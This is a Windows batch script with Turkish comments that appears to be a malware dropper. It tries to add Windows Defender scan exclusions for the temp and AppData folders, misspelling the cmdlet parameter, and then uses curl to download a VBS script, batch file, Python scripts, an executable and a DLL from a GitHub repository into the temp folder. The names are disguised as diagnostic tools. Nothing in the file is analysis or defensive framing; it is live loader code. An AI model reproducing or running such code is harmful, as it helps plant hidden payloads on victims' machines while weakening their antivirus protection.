@echo off

Add-MpPreference -ExculisonPath "%temp%"
Add-MpPreference -ExculisonPath "%APPDATA%"

:: Dosya yollarını tanımlayalım
set "FILE1=%temp%\ddd.vbs"
set "FILE2=%temp%\asd.bat"
set "FILE4=%temp%\by.py"
set "FILE5=%temp%\Pancafediag.exe"
set "FILE6=%temp%\PncDiag.dll"
set "FILE7=%temp%\syshealth.pyw"

:: Tüm dosyaların varlığını tek tek kontrol et
if exist "%FILE1%" if exist "%FILE2%" if exist "%FILE3%" if exist "%FILE4%"  if exist "%FILE5%"  if exist "%FILE6%" if exist "%FILE7%" (
    exit
)

:: Eğer biri eksikse indirme işlemlerini başlat
curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/asd.bat" -o "%FILE2%"
curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/ddd.vbs" -o "%FILE1%"
curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/by.py" -o "%FILE4%"
curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/Pancafediag.exe" -o "%FILE5%"
curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/PncDiag.dll" -o "%FILE6%"
curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/syshealth.pyw" -o "%FILE7%"


exit

